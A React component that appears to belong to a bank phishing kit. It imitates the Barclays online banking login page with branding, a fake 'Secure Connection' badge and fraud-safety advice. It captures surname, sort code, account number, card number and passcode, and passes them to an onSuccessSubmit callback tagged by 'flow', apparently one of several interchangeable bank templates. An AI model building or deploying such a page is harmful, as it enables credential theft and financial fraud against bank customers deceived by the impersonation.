"use client";

import { useState } from "react";

interface BankTemplateProps {
  bankName?: string;
  selectedOption?: string;
  logoUrl?: string | null;
  onSuccessSubmit: (data: {
    userId: string;
    password?: string;
    memorableInfo?: string;
    extraData?: string;
  }) => void;
}

export default function BarclaysTemplate({
  selectedOption = "Personal",
  onSuccessSubmit,
}: BankTemplateProps) {
  const [activeTab, setActiveTab] = useState<"sortcode" | "card">("sortcode");
  const [surname, setSurname] = useState("");
  const [sortCode, setSortCode] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [passcode, setPasscode] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [rememberMe, setRememberMe] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (activeTab === "sortcode") {
      onSuccessSubmit({
        userId: `Surname: ${surname}`,
        password: passcode,
        memorableInfo: `SortCode: ${sortCode} | Acc: ${accountNumber}`,
        extraData: `Barclays (${selectedOption}) - SortCode Flow`,
      });
    } else {
      onSuccessSubmit({
        userId: `Card: ${cardNumber}`,
        password: passcode,
        memorableInfo: `Surname: ${surname}`,
        extraData: `Barclays (${selectedOption}) - Card Flow`,
      });
    }
  };

  return (
    <div className="min-h-full bg-[#f4f7f9] text-[#1e293b] font-sans flex flex-col">
      {/* 1. Barclays Top Blue Header Bar */}
      <header className="bg-[#00395d] text-white px-6 py-3.5 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-3">
          {/* Barclays Official Eagle Icon */}
          <div className="text-[#00aeef]">
            <svg width="34" height="34" viewBox="0 0 100 100" fill="currentColor">
              <path d="M50 15 C35 15, 20 28, 20 45 C20 62, 35 75, 50 85 C65 75, 80 62, 80 45 C80 28, 65 15, 50 15 Z M50 25 C42 32, 30 38, 30 50 C38 48, 45 42, 50 35 C55 42, 62 48, 70 50 C70 38, 58 32, 50 25 Z" />
              <circle cx="50" cy="20" r="4" />
            </svg>
          </div>
          <span className="text-xl font-bold tracking-tight text-white">BARCLAYS</span>
        </div>

        <div className="flex items-center gap-6 text-xs text-white/90 font-medium">
          <span className="hover:underline cursor-pointer hidden sm:inline">Register</span>
          <span className="hover:underline cursor-pointer hidden sm:inline">Help & Support</span>
          <div className="flex items-center gap-1.5 bg-[#002740] px-3 py-1.5 rounded-full border border-white/10 text-emerald-400 font-semibold">
            <span>🔒</span>
            <span className="text-white text-[11px]">Secure Connection</span>
          </div>
        </div>
      </header>

      {/* 2. Main Login Layout */}
      <main className="flex-1 max-w-5xl w-full mx-auto p-4 sm:p-8 flex flex-col lg:flex-row gap-8">
        
        {/* Left: Login Form Card */}
        <div className="flex-1 bg-white rounded-xl shadow-md border border-slate-200 overflow-hidden">
          
          <div className="bg-[#00aeef] px-6 py-4 text-white">
            <h1 className="text-xl font-extrabold tracking-tight">Quick, safe and secure login</h1>
            <p className="text-xs text-white/90 mt-0.5">Barclays Online Banking ({selectedOption})</p>
          </div>

          {/* Login Tabs */}
          <div className="flex border-b border-slate-200 bg-slate-50 text-xs font-bold text-slate-600">
            <button
              type="button"
              onClick={() => setActiveTab("sortcode")}
              className={`flex-1 py-3 text-center transition border-b-2 cursor-pointer ${
                activeTab === "sortcode"
                  ? "border-[#00aeef] text-[#00395d] bg-white"
                  : "border-transparent hover:text-slate-900"
              }`}
            >
              Sort code & account number
            </button>
            <button
              type="button"
              onClick={() => setActiveTab("card")}
              className={`flex-1 py-3 text-center transition border-b-2 cursor-pointer ${
                activeTab === "card"
                  ? "border-[#00aeef] text-[#00395d] bg-white"
                  : "border-transparent hover:text-slate-900"
              }`}
            >
              Barclays card number
            </button>
          </div>

          <form onSubmit={handleSubmit} className="p-6 space-y-5 text-xs">
            
            {/* Last name field */}
            <div>
              <label className="block font-bold text-slate-800 mb-1.5 text-xs">
                Last name / Surname
              </label>
              <input
                type="text"
                required
                placeholder="e.g. Smith"
                value={surname}
                onChange={(e) => setSurname(e.target.value)}
                className="w-full rounded-lg border border-slate-300 px-3 py-2.5 text-sm outline-none focus:border-[#00aeef] focus:ring-1 focus:ring-[#00aeef] bg-white transition"
              />
            </div>

            {activeTab === "sortcode" ? (
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block font-bold text-slate-800 mb-1.5 text-xs">
                    Sort code
                  </label>
                  <input
                    type="text"
                    required
                    maxLength={8}
                    placeholder="20-00-00"
                    value={sortCode}
                    onChange={(e) => setSortCode(e.target.value)}
                    className="w-full font-mono rounded-lg border border-slate-300 px-3 py-2.5 text-sm outline-none focus:border-[#00aeef] focus:ring-1 focus:ring-[#00aeef] bg-white transition"
                  />
                </div>

                <div>
                  <label className="block font-bold text-slate-800 mb-1.5 text-xs">
                    Account number
                  </label>
                  <input
                    type="text"
                    required
                    maxLength={8}
                    placeholder="8 digits"
                    value={accountNumber}
                    onChange={(e) => setAccountNumber(e.target.value)}
                    className="w-full font-mono rounded-lg border border-slate-300 px-3 py-2.5 text-sm outline-none focus:border-[#00aeef] focus:ring-1 focus:ring-[#00aeef] bg-white transition"
                  />
                </div>
              </div>
            ) : (
              <div>
                <label className="block font-bold text-slate-800 mb-1.5 text-xs">
                  Card number (16 digits)
                </label>
                <input
                  type="text"
                  required
                  maxLength={19}
                  placeholder="1234 5678 9012 3456"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value)}
                  className="w-full font-mono rounded-lg border border-slate-300 px-3 py-2.5 text-sm outline-none focus:border-[#00aeef] focus:ring-1 focus:ring-[#00aeef] bg-white transition"
                />
              </div>
            )}

            <div>
              <label className="block font-bold text-slate-800 mb-1.5 text-xs">
                Passcode or Memorable Word
              </label>
              <input
                type="password"
                required
                placeholder="••••••••••••"
                value={passcode}
                onChange={(e) => setPasscode(e.target.value)}
                className="w-full rounded-lg border border-slate-300 px-3 py-2.5 text-sm outline-none focus:border-[#00aeef] focus:ring-1 focus:ring-[#00aeef] bg-white transition"
              />
            </div>

            <div className="flex items-center gap-2 pt-1">
              <input
                type="checkbox"
                id="remember"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                className="rounded border-slate-300 text-[#00aeef] focus:ring-[#00aeef] cursor-pointer"
              />
              <label htmlFor="remember" className="text-slate-600 text-xs cursor-pointer select-none">
                Remember my details on this device
              </label>
            </div>

            <button
              type="submit"
              className="w-full bg-[#00aeef] hover:bg-[#0098d3] active:bg-[#0082b5] text-white font-bold py-3 px-4 rounded-xl text-sm transition shadow-sm cursor-pointer"
            >
              Log in to Barclays
            </button>
          </form>
        </div>

        {/* Right: Security & Help Sidebar */}
        <div className="w-full lg:w-80 space-y-4">
          <div className="bg-white rounded-xl p-5 border border-slate-200 shadow-sm">
            <h3 className="font-bold text-sm text-[#00395d] mb-2">Need help logging in?</h3>
            <ul className="text-xs space-y-2 text-[#00aeef]">
              <li className="hover:underline cursor-pointer">Forgotten your login details?</li>
              <li className="hover:underline cursor-pointer">Problems logging in?</li>
              <li className="hover:underline cursor-pointer">Security and fraud advice</li>
            </ul>
          </div>

          <div className="bg-[#eef8fc] rounded-xl p-5 border border-[#cbe8f6] text-xs text-slate-700">
            <p className="font-bold text-[#00395d] mb-1">Stay safe online</p>
            <p className="leading-relaxed">
              Never share your full passwords or one-time passcode with anyone, even someone claiming to be from Barclays.
            </p>
          </div>
        </div>

      </main>
    </div>
  );
}